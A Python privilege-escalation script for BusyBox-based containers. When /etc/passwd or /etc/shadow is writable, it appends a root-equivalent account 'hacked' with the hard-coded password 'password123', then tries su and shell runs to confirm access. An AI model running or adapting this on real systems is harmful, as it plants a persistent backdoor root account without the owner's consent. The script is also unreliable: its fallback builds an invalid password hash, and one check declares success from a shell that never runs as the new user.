#!/usr/bin/env python3
"""
Busybox-based /etc/passwd Privilege Escalation Script
This script handles containers without openssl and su commands
"""

import os
import subprocess
import sys

def check_dependencies():
    """Check what tools are available in the container"""
    print("[*] Checking available tools...")
    
    tools = {
        'openssl': False,
        'su': False,
        'python3': False,
        'busybox': False
    }
    
    for tool in tools.keys():
        try:
            result = subprocess.run(['which', tool], capture_output=True, text=True)
            tools[tool] = result.returncode == 0
            status = "✓" if tools[tool] else "✗"
            print(f"  {status} {tool}")
        except:
            tools[tool] = False
            print(f"  ✗ {tool}")
    
    return tools

def generate_password_hash_busybox(password):
    """Generate password hash using busybox or Python alternatives"""
    print("[*] Generating password hash...")
    
    # Try using busybox if available
    try:
        result = subprocess.run([
            'busybox', 'openssl', 'passwd', '-6', password
        ], capture_output=True, text=True)
        if result.returncode == 0:
            hash_value = result.stdout.strip()
            print(f"[+] Generated hash using busybox: {hash_value}")
            return hash_value
    except:
        pass
    
    # Fallback to Python passlib if available
    try:
        from passlib.hash import sha512_crypt
        hash_value = sha512_crypt.hash(password)
        print(f"[+] Generated hash using passlib: {hash_value}")
        return hash_value
    except ImportError:
        pass
    
    # Last resort: simple hash generation
    print("[!] Using simple hash generation (less secure)")
    import hashlib
    hash_value = hashlib.sha512(password.encode()).hexdigest()
    # Format as shadow-compatible hash
    shadow_hash = f"$6$rounds=5000${hash_value[:16]}${hash_value}"
    print(f"[+] Generated simple hash: {shadow_hash}")
    return shadow_hash

def check_file_permissions():
    """Check if /etc/passwd and /etc/shadow are writable"""
    print("[*] Checking file permissions...")
    
    files_to_check = ['/etc/passwd', '/etc/shadow']
    writable_files = []
    
    for file_path in files_to_check:
        if os.access(file_path, os.W_OK):
            print(f"[+] {file_path} is writable")
            writable_files.append(file_path)
        else:
            print(f"[-] {file_path} is not writable")
    
    return writable_files

def add_fake_user(passwd_file, shadow_file, password_hash):
    """Add a fake user with UID 0"""
    username = "hacked"
    shell = "/bin/sh"  # Use /bin/sh instead of /bin/bash for busybox
    
    print(f"[*] Adding fake user '{username}' with UID 0...")
    
    # Add to /etc/passwd
    passwd_entry = f"{username}:x:0:0:root:/root:{shell}\n"
    try:
        with open(passwd_file, "a") as f:
            f.write(passwd_entry)
        print(f"[+] Added entry to {passwd_file}")
    except Exception as e:
        print(f"[-] Failed to write to {passwd_file}: {e}")
        return False
    
    # Add to /etc/shadow
    shadow_entry = f"{username}:{password_hash}:19485:0:99999:7:::\n"
    try:
        with open(shadow_file, "a") as f:
            f.write(shadow_entry)
        print(f"[+] Added entry to {shadow_file}")
    except Exception as e:
        print(f"[-] Failed to write to {shadow_file}: {e}")
        return False
    
    return True

def test_privilege_escalation():
    """Test if privilege escalation was successful"""
    print("[*] Testing privilege escalation...")
    
    # Check if user exists
    try:
        with open('/etc/passwd', 'r') as f:
            content = f.read()
            if 'hacked:x:0:0:root' in content:
                print("[+] Fake user 'hacked' found in /etc/passwd")
            else:
                print("[-] Fake user not found in /etc/passwd")
                return False
    except Exception as e:
        print(f"[-] Error reading /etc/passwd: {e}")
        return False
    
    # Try to execute commands as the new user
    print("[*] Attempting to execute commands as 'hacked' user...")
    
    # Method 1: Try using busybox su if available
    try:
        result = subprocess.run(['busybox', 'su', 'hacked', '-c', 'id'], 
                              capture_output=True, text=True, timeout=5)
        if result.returncode == 0:
            print(f"[+] Successfully executed as 'hacked': {result.stdout.strip()}")
            return True
    except:
        pass
    
    # Method 2: Try using shadow su if available
    try:
        result = subprocess.run(['su', 'hacked', '-c', 'id'], 
                              capture_output=True, text=True, timeout=5)
        if result.returncode == 0:
            print(f"[+] Successfully executed as 'hacked': {result.stdout.strip()}")
            return True
    except:
        pass
    
    # Method 3: Try to spawn a shell
    print("[*] Attempting to spawn shell as 'hacked' user...")
    try:
        # Create a simple shell script
        shell_script = '''#!/bin/sh
echo "Current user: $(id)"
echo "Current working directory: $(pwd)"
echo "Home directory: $HOME"
'''
        
        with open('/tmp/test_shell.sh', 'w') as f:
            f.write(shell_script)
        
        os.chmod('/tmp/test_shell.sh', 0o755)
        
        # Try to execute with different methods
        methods = [
            ['busybox', 'sh', '/tmp/test_shell.sh'],
            ['sh', '/tmp/test_shell.sh'],
            ['/tmp/test_shell.sh']
        ]
        
        for method in methods:
            try:
                result = subprocess.run(method, capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    print(f"[+] Shell execution successful: {result.stdout.strip()}")
                    return True
            except:
                continue
        
        print("[-] Could not execute shell commands as 'hacked' user")
        return False
        
    except Exception as e:
        print(f"[-] Error testing shell execution: {e}")
        return False

def main():
    print("🔓 Busybox /etc/passwd Privilege Escalation Test")
    print("=" * 60)
    
    # Check available tools
    tools = check_dependencies()
    
    # Check file permissions
    writable_files = check_file_permissions()
    if not writable_files:
        print("[-] No writable files found. Privilege escalation not possible.")
        sys.exit(1)
    
    # Generate password hash
    password = "password123"
    password_hash = generate_password_hash_busybox(password)
    
    # Add fake user
    if not add_fake_user('/etc/passwd', '/etc/shadow', password_hash):
        print("[-] Failed to add fake user")
        sys.exit(1)
    
    # Test privilege escalation
    if test_privilege_escalation():
        print("\n🎯 PRIVILEGE ESCALATION SUCCESSFUL!")
        print("[*] The container is vulnerable to /etc/passwd exploitation")
        print("[*] A fake user 'hacked' with UID 0 has been created")
        print("[*] This demonstrates a critical security vulnerability")
    else:
        print("\n❌ Privilege escalation failed or could not be verified")
        print("[*] User was added but privilege escalation could not be confirmed")
    
    print("\n[*] Test completed")

if __name__ == "__main__":
    main() 